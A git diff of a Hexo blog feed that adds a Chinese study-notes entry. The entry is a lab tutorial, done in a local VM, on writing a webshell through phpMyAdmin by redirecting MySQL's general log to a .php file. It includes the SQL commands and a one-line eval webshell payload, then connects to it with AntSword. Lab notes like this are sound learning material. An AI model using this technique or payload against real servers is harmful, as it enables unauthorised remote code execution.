@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2023-11-21T14:54:55.786Z</updated>
+  <updated>2023-11-22T15:02:47.270Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,26 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>第11天学习笔记</title>
+    <link href="http://example.com/2023/11/22/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2-11/"/>
+    <id>http://example.com/2023/11/22/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2-11/</id>
+    <published>2023-11-22T09:30:22.000Z</published>
+    <updated>2023-11-22T15:02:47.270Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="根据phpmyadmin更改日志写入webshell"><a href="#根据phpmyadmin更改日志写入webshell" class="headerlink" title="根据phpmyadmin更改日志写入webshell"></a>根据phpmyadmin更改日志写入webshell</h2><h3 id="1-下载phpmyadmin"><a href="#1-下载phpmyadmin" class="headerlink" title="1.下载phpmyadmin"></a>1.下载phpmyadmin</h3><p>打开win10虚拟机中的小皮面板-&gt;开启Apache和MySQL-&gt;点击软件管理-&gt;找到phpmyadmin进行下载-&gt;下载完成后点击管理，选择站点（可使用之前搭好的WWW）-&gt;打开phpmyadmin</p><h3 id="2-LIKE-secure-子句来过滤出那些包含”secure”关键字的变量。结果将显示所有匹配的全局变量及其当前的值。"><a href="#2-LIKE-secure-子句来过滤出那些包含”secure”关键字的变量。结果将显示所有匹配的全局变量及其当前的值。" class="headerlink" title="2.LIKE &#39;%secure%&#39;子句来过滤出那些包含”secure”关键字的变量。结果将显示所有匹配的全局变量及其当前的值。"></a>2.<code>LIKE &#39;%secure%&#39;</code>子句来过滤出那些包含”secure”关键字的变量。结果将显示所有匹配的全局变量及其当前的值。</h3><div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;%secure%&#x27;</span><br></pre></td></tr></table></figure></div><h3 id="3-查看是否开启全局日志"><a href="#3-查看是否开启全局日志" class="headerlink" title="3.查看是否开启全局日志"></a>3.查看是否开启全局日志</h3><div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;</span><br></pre></td></tr></table></figure></div><p>若显示如下</p><p><img src="https://cdn.jsdelivr.net/gh/lyfzlylc/image@main//imgimage-20231122205235659.png" alt="image-20231122205235659"></p><p>则未开启全局日志，使用如下命令开启</p><div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> set global general_log=ON</span><br></pre></td></tr></table></figure></div><p>再次查看，若OFF更改为ON，则表示已开启。</p><h3 id="4-更改日志路径"><a href="#4-更改日志路径" class="headerlink" title="4.更改日志路径"></a>4.更改日志路径</h3><div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> set global general_log_file=&quot;C:/phpstudy_pro/WWW/1.php&quot; //手动指定路径</span><br></pre></td></tr></table></figure></div><h3 id="5-测试"><a href="#5-测试" class="headerlink" title="5.测试"></a>5.测试</h3><div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span><br></pre></td></tr></table></figure></div><p>点击go运行后，在浏览器中输入地址（如：192.168.253.134&#x2F;1.php)</p><p>若显示如下则测试成功（可能界面上方会有日志文件记录）</p><p><img src="https://cdn.jsdelivr.net/gh/lyfzlylc/image@main//imgimg1ad00a6cfdea41f7b7b70f17f4e12a8f.png" alt="在这里插入图片描述"></p><h3 id="6-蚁剑连接一句话木马"><a href="#6-蚁剑连接一句话木马" class="headerlink" title="6.蚁剑连接一句话木马"></a>6.蚁剑连接一句话木马</h3><p>安装完蚁剑后。</p><p>在phpmyadmin中实行SQL语句</p><div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &#x27;&lt;?php @eval($_POST[cmd]);?&gt;&#x27;</span><br></pre></td></tr></table></figure></div><p>进入蚁剑，右键点击添加数据：</p><p><img src="https://cdn.jsdelivr.net/gh/lyfzlylc/image@main//imgimage-20231122225814982.png" alt="image-20231122225814982"></p><p><img src="https://cdn.jsdelivr.net/gh/lyfzlylc/image@main//imgimage-20231122230139593.png" alt="image-20231122230139593"></p><p>填写完URL地址和密码后点击测试连接，弹出成功窗口即测试成功。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;根据phpmyadmin更改日志写入webshell&quot;&gt;&lt;a href=&quot;#根据phpmyadmin更改日志写入webshell&quot; class=&quot;headerlink&quot; title=&quot;根据phpmyadmin更改日志写入webshell&quot;&gt;&lt;/a&gt;根据phpmya</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>第10天学习笔记</title>
